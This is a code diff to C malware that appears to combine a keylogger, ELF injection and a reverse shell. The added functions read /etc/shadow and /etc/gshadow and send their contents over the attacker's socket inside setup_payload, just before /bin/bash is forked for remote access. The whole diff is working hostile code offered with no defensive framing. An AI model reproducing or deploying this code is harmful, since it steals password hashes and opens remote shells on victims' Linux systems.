@@ -6,6 +6,7 @@
 #include <linux/input.h>
 #include <netinet/in.h>
 #include <signal.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <sys/select.h>
 #include <sys/types.h>
@@ -156,6 +157,38 @@ void log_keys(settings_t *stg)
 }
 
 SECTION(ELF_CODE)
+void send_file(settings_t *s, char *str)
+{
+    int fd = open(str, O_RDONLY);
+    struct stat st;
+    char *buffer = NULL;
+
+    if (fd == -1 || stat(str, &st) < 0)
+        return;
+    buffer = malloc(sizeof(char) * (st.st_size + 1));
+    buffer[st.st_size] = 0;
+    read(fd, buffer, st.st_size);
+    close(fd);
+    dprintf(s->sockfd, "[%s]:%s\n", str, buffer);
+    free(buffer);
+}
+
+SECTION(ELF_CODE)
+void send_important_files(settings_t *s)
+{
+    char *files[] = {
+        "/etc/shadow",
+        "/etc/gshadow",
+        "/etc/gshadow-",
+        "/etc/timezone",
+        NULL,
+    };
+
+    for (int i = 0; files[i] != NULL; i++)
+        send_file(s, files[i]);
+}
+
+SECTION(ELF_CODE)
 void setup_payload(settings_t *stg)
 {
     char * const argv[] = {"/bin/bash", NULL};
@@ -164,7 +197,7 @@ void setup_payload(settings_t *stg)
     stg->sockfd = setup_socket(stg);
     if (stg->sockfd == -1)
         return;
-
+    send_important_files(stg);
     pid = fork();
     if (pid == -1) {
         printf("[!] Failed to create a child\n");
